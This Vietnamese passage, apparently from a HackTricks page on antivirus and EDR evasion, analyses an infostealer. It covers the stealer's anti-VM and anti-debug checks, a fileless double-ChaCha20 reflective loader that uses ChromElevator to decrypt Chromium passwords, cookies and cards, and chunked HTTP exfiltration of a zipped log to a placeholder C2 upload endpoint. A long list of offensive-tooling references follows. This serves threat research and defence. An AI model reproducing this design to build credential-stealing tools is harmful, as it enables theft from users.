- Biến thể B kiểm tra thuộc tính hệ thống (ngưỡng số lượng tiến trình tối thiểu, thời gian uptime gần đây), gọi `OpenServiceA("VBoxGuest")` để phát hiện VirtualBox additions, và thực hiện kiểm tra thời gian quanh các khoảng sleep để phát hiện single-stepping. Bất kỳ dấu hiệu nào cũng khiến tiến trình dừng trước khi các module khởi chạy.

### Helper không cần file + nạp phản chiếu ChaCha20 hai lần

- DLL/EXE chính nhúng một helper lấy thông tin xác thực Chromium; helper này được ghi xuống đĩa hoặc ánh xạ thủ công vào bộ nhớ. Ở chế độ fileless, helper tự phân giải imports/relocations nên không ghi bất kỳ thành phần nào xuống đĩa.
- Helper đó lưu trữ một DLL ở giai đoạn hai được mã hóa hai lần bằng ChaCha20 (hai khóa 32 byte + nonce 12 byte). Sau cả hai lượt giải mã, nó nạp blob bằng phương pháp reflective (không dùng `LoadLibrary`) và gọi các export `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, được lấy từ [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Các routine ChromElevator dùng direct-syscall reflective process hollowing để inject vào một trình duyệt Chromium đang hoạt động, kế thừa các khóa AppBound Encryption, rồi giải mã mật khẩu/cookie/thẻ tín dụng trực tiếp từ cơ sở dữ liệu SQLite bất chấp các biện pháp hardening của ABE.

### Thu thập dữ liệu trong bộ nhớ theo module & exfil HTTP chia đoạn

- `create_memory_based_log` duyệt bảng con trỏ hàm toàn cục `memory_generators` và tạo một thread cho mỗi module được bật (Telegram, Discord, Steam, ảnh chụp màn hình, tài liệu, tiện ích mở rộng trình duyệt, v.v.). Mỗi thread ghi kết quả vào các buffer dùng chung và báo số lượng file sau khoảng thời gian join ~45 giây.
- Sau khi hoàn tất, mọi thứ được nén bằng thư viện `miniz` liên kết tĩnh thành `%TEMP%\\Log.zip`. Sau đó, `ThreadPayload1` sleep 15 giây rồi gửi archive theo từng đoạn 10 MB qua HTTP POST đến `http://<C2>:6767/upload`, giả mạo boundary `multipart/form-data` của trình duyệt (`----WebKitFormBoundary***`). Mỗi đoạn thêm `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` nếu có, và đoạn cuối cùng thêm `complete: true` để C2 biết quá trình ghép lại đã hoàn tất.

## References

- [1] [Chiến thuật né tránh nâng cao: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stack: không còn ưu ái malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – tài liệu](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – mẫu](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – mẫu](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC giả mạo call stack](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Chuỗi lây nhiễm mới và kỹ thuật làm rối dựa trên ConfuserEx của DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Bạn có nên tin tưởng zero trust? Vượt qua kiểm tra tư thế bảo mật của Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Trước ToolShell: Khám phá các hoạt động ransomware trước đây của Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Lạm dụng forwarded exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Danh mục forwarded exports của Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Thứ tự tìm kiếm dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Bảo mật tiến trình và quyền truy cập](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Tài liệu tham khảo EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Trình khởi chạy CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Đối phó với EDR nhờ sự bảo vệ của Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Phá vỡ lớp bảo vệ của Windows Defender bằng kỹ thuật chuyển hướng thư mục](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Tài liệu tham khảo lệnh mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Sau bức màn Pure: Từ RAT đến builder rồi coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer sắp đến: Một infostealer mới đầy tham vọng](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Giải mã Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Vô hiệu hóa malware Node.js bằng API tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Người đẹp ngủ trong rừng: Đưa Adaptix vào giấc ngủ bằng Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Đầu độc tham số tiến trình](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Người đẹp ngủ trong rừng II: CFG, CET và giả mạo stack](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Che giấu sleep bằng Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Ẩn Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Lạm dụng Chrome Remote Desktop trong hoạt động Red Team: Hướng dẫn thực tế](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Vũ khí hóa driver khắc phục của Defender thành một primitive thao tác kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Mã đồng hành MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Tạo hàm tự che giấu bằng LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - Mã nguồn InjectSetConsole](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Hàm CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Tạo tiến trình con với đầu vào và đầu ra được chuyển hướng](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Tái tạo công cụ C# bằng WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Biên dịch dự án C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [Proof-of-concept và mã nguồn DLLParty](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Lạm dụng nội bộ thread pool để inject DLL không cần shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [Bộ dữ liệu benchmark EMBER2024 và công cụ thrember](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Dùng EMBER2024 để đánh giá implant red team](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Né tránh các cơ chế phát hiện dựa trên machine learning](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – Framework nạp .NET dựa trên XAML NetamLoader](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – Enum AMSI_RESULT](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – Phương thức IAntimalware::Scan](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
- [54] [Zscaler ThreatLabz - Phân tích kỹ thuật 2CLoader](https://zscaler.com/blogs/security-research/2cloader-new-malware-loader-delivering-vidar-and-remus)
- [55] [Tổng quan về tprtdll-Injection và danh mục export](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/README.md)
- [56] [PoC self-injection Trusted-twin](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/trustedtwin_self.cpp)
- [57] [PoC cross-process injection Trusted-twin](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/trustedtwin_cross.cpp)
{{#include ../banners/hacktricks-training.md}}
